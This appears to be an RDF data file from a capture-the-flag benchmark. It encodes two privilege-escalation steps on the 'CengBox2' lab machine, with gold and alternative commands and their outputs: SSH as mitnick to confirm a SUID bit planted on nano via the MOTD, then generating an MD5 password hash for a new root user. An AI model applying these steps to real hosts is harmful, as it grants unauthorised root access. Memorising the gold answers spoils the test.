<https://example.org/bracegreen/ctf#step_CengBox2_15> <https://example.org/bracegreen/ctf#has_goal> "Trigger MOTD execution and verify nano has SUID permissions" .
<https://example.org/bracegreen/ctf#step_CengBox2_15> <https://example.org/bracegreen/ctf#is_optional> "false"^^<http://www.w3.org/2001/XMLSchema#boolean> .
<https://example.org/bracegreen/ctf#step_CengBox2_15> <https://example.org/bracegreen/ctf#has_cmd> <https://example.org/bracegreen/ctf#cmd_CengBox2_15_gold> .
<https://example.org/bracegreen/ctf#step_CengBox2_15> <https://example.org/bracegreen/ctf#requires> "MOTD header modified to set SUID on nano" .
<https://example.org/bracegreen/ctf#step_CengBox2_15> <https://example.org/bracegreen/ctf#requires> "SSH access as mitnick user" .
<https://example.org/bracegreen/ctf#step_CengBox2_15> <https://example.org/bracegreen/ctf#next_step> <https://example.org/bracegreen/ctf#step_CengBox2_16> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_15_gold> <http://www.w3.org/1999/02/22-rdf-syntax-ns#type> <https://example.org/bracegreen/ctf#Command> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_15_gold> <https://example.org/bracegreen/ctf#command_text> "exit\nssh -i key mitnick@192.168.1.104\nls -la /bin/nano" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_15_gold> <https://example.org/bracegreen/ctf#has_output> "logout\nConnection to 192.168.1.104 closed.\nroot@kali:~# ssh -i key mitnick@192.168.1.104\nEnter passphrase for key 'key':\n\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\n177 packages can be updated.\n130 updates are security updates.\n\nNew release '18.04.4 LTS' available.\nRun 'do-release-upgrade' to upgrade to it.\n\nLast login: Tue Jun 2 10:38:44 2020 from 192.168.1.112\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\nmitnick@cengbox:~$ ls -la /bin/nano\n-rwsr-xr-x 1 root root 208480 Feb 15 2017 /bin/nano" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_15_gold> <https://example.org/bracegreen/ctf#is_gold> "true"^^<http://www.w3.org/2001/XMLSchema#boolean> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_15_gold> <https://example.org/bracegreen/ctf#has_result> "nano binary now has SUID bit set (rwsr-xr-x)" .
<https://example.org/bracegreen/ctf#step_CengBox2_16> <http://www.w3.org/1999/02/22-rdf-syntax-ns#type> <https://example.org/bracegreen/ctf#Step> .
<https://example.org/bracegreen/ctf#step_CengBox2_16> <http://www.w3.org/2000/01/rdf-schema#label> "CengBox2 step 16" .
<https://example.org/bracegreen/ctf#step_CengBox2_16> <https://example.org/bracegreen/ctf#part_of> <https://example.org/bracegreen/ctf#challenge_CengBox2> .
<https://example.org/bracegreen/ctf#step_CengBox2_16> <https://example.org/bracegreen/ctf#has_tactic> <http://attack.mitre.org/tactics#Privilege_Escalation> .
<https://example.org/bracegreen/ctf#step_CengBox2_16> <https://example.org/bracegreen/ctf#has_goal> "Generate password hash for new root-privileged user" .
<https://example.org/bracegreen/ctf#step_CengBox2_16> <https://example.org/bracegreen/ctf#is_optional> "false"^^<http://www.w3.org/2001/XMLSchema#boolean> .
<https://example.org/bracegreen/ctf#step_CengBox2_16> <https://example.org/bracegreen/ctf#has_cmd> <https://example.org/bracegreen/ctf#cmd_CengBox2_16_gold> .
<https://example.org/bracegreen/ctf#step_CengBox2_16> <https://example.org/bracegreen/ctf#requires> "nano has SUID permissions" .
<https://example.org/bracegreen/ctf#step_CengBox2_16> <https://example.org/bracegreen/ctf#next_step> <https://example.org/bracegreen/ctf#step_CengBox2_17> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_gold> <http://www.w3.org/1999/02/22-rdf-syntax-ns#type> <https://example.org/bracegreen/ctf#Command> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_gold> <https://example.org/bracegreen/ctf#command_text> "openssl passwd -1 -salt user3 pass123" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_gold> <https://example.org/bracegreen/ctf#has_output> "$1$user3$rAGRVf5p2jYTqtqOW5cPu/" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_gold> <https://example.org/bracegreen/ctf#is_gold> "true"^^<http://www.w3.org/2001/XMLSchema#boolean> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_gold> <https://example.org/bracegreen/ctf#has_result> "Password hash generated: $1$user3$rAGRVf5p2jYTqtqOW5cPu/" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_alt_1> <http://www.w3.org/1999/02/22-rdf-syntax-ns#type> <https://example.org/bracegreen/ctf#Command> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_alt_1> <https://example.org/bracegreen/ctf#command_text> "perl -e 'print crypt(\"pass123\", \"\\$1\\$user3\\$\") . \"\\n\"'" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_alt_1> <https://example.org/bracegreen/ctf#has_output> "$1$user3$rAGRVf5p2jYTqtqOW5cPu/" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_alt_1> <https://example.org/bracegreen/ctf#is_gold> "false"^^<http://www.w3.org/2001/XMLSchema#boolean> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_alt_1> <https://example.org/bracegreen/ctf#has_result> "Password hash generated: $1$user3$rAGRVf5p2jYTqtqOW5cPu/" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_gold> <https://example.org/bracegreen/ctf#or> <https://example.org/bracegreen/ctf#cmd_CengBox2_16_alt_1> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_alt_2> <http://www.w3.org/1999/02/22-rdf-syntax-ns#type> <https://example.org/bracegreen/ctf#Command> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_alt_2> <https://example.org/bracegreen/ctf#command_text> "mkpasswd -m md5crypt -S user3 pass123" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_alt_2> <https://example.org/bracegreen/ctf#has_output> "$1$user3$rAGRVf5p2jYTqtqOW5cPu/" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_alt_2> <https://example.org/bracegreen/ctf#is_gold> "false"^^<http://www.w3.org/2001/XMLSchema#boolean> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_alt_2> <https://example.org/bracegreen/ctf#has_result> "Password hash generated: $1$user3$rAGRVf5p2jYTqtqOW5cPu/" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_16_gold> <https://example.org/bracegreen/ctf#or> <https://example.org/bracegreen/ctf#cmd_CengBox2_16_alt_2> .
<https://example.org/bracegreen/ctf#step_CengBox2_17> <http://www.w3.org/1999/02/22-rdf-syntax-ns#type> <https://example.org/bracegreen/ctf#Step> .
